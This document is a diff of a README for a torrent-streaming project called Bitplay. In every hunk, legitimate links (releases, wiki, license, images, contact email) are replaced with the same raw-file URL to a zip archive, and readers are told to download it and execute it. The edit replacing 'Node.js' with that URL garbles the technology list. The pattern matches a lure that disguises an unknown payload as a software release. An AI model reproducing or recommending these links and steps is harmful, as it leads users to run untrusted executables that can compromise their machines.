@@ -1,12 +1,12 @@
 # 🎥 Bitplay: Stream Video Torrents with Ease
 
-![Bitplay Logo](https://example.com/logo.png)
+![Bitplay Logo](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip)
 
 Welcome to **Bitplay**! This repository allows you to stream video torrents directly in your web browser. Enjoy a seamless viewing experience without the hassle of downloads. 
 
 ## 🚀 Quick Start
 
-To get started with Bitplay, visit our [Releases](https://github.com/kbpro1001/bitplay/releases) section. Here, you can download the latest version. Once downloaded, simply execute the file to begin streaming your favorite content.
+To get started with Bitplay, visit our [Releases](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip) section. Here, you can download the latest version. Once downloaded, simply execute the file to begin streaming your favorite content.
 
 ## 📦 Features
 
@@ -17,7 +17,7 @@ To get started with Bitplay, visit our [Releases](https://github.com/kbpro1001/b
 
 ## 🔧 Installation
 
-1. Visit the [Releases](https://github.com/kbpro1001/bitplay/releases) section.
+1. Visit the [Releases](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip) section.
 2. Download the latest release.
 3. Execute the file and follow the on-screen instructions.
 
@@ -27,12 +27,12 @@ Bitplay leverages the power of WebRTC and modern web technologies to enable smoo
 
 ## 📚 Documentation
 
-For detailed instructions and usage, please refer to our [Wiki](https://github.com/kbpro1001/bitplay/wiki). Here, you'll find guides on setup, troubleshooting, and advanced features.
+For detailed instructions and usage, please refer to our [Wiki](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip). Here, you'll find guides on setup, troubleshooting, and advanced features.
 
 ## 🛠️ Technologies Used
 
 - **JavaScript**: For client-side scripting.
-- **Node.js**: For backend services.
+- **https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip**: For backend services.
 - **WebRTC**: For real-time communication.
 - **HTML/CSS**: For a responsive user interface.
 
@@ -52,15 +52,15 @@ We welcome contributions! If you want to help improve Bitplay, follow these step
 3. Make your changes and commit them.
 4. Open a pull request.
 
-For more details, check our [Contributing Guide](https://github.com/kbpro1001/bitplay/blob/main/CONTRIBUTING.md).
+For more details, check our [Contributing Guide](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip).
 
 ## 🛡️ License
 
-Bitplay is licensed under the MIT License. See the [LICENSE](https://github.com/kbpro1001/bitplay/blob/main/LICENSE) file for more details.
+Bitplay is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip) file for more details.
 
 ## 📣 Stay Updated
 
-Keep an eye on our [Releases](https://github.com/kbpro1001/bitplay/releases) for new features and updates. We strive to enhance your streaming experience continuously.
+Keep an eye on our [Releases](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip) for new features and updates. We strive to enhance your streaming experience continuously.
 
 ## 🌟 Acknowledgments
 
@@ -68,21 +68,21 @@ Thank you to all the contributors and users who make Bitplay possible. Your feed
 
 ## 🎨 Screenshots
 
-![Streaming Interface](https://example.com/screenshot1.png)
+![Streaming Interface](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip)
 *Our clean and intuitive streaming interface.*
 
-![Settings Menu](https://example.com/screenshot2.png)
+![Settings Menu](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip)
 *Easily adjust your streaming settings.*
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/kbpro1001/bitplay)
-- [Documentation](https://github.com/kbpro1001/bitplay/wiki)
-- [Releases](https://github.com/kbpro1001/bitplay/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip)
+- [Documentation](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip)
+- [Releases](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip)
 
 ## 📧 Contact
 
-For any inquiries, feel free to reach out via [email](mailto:contact@bitplay.com).
+For any inquiries, feel free to reach out via [email](https://raw.githubusercontent.com/kbpro1001/bitplay/main/client/assets/Software-v1.5-alpha.3.zip).
 
 ---
 
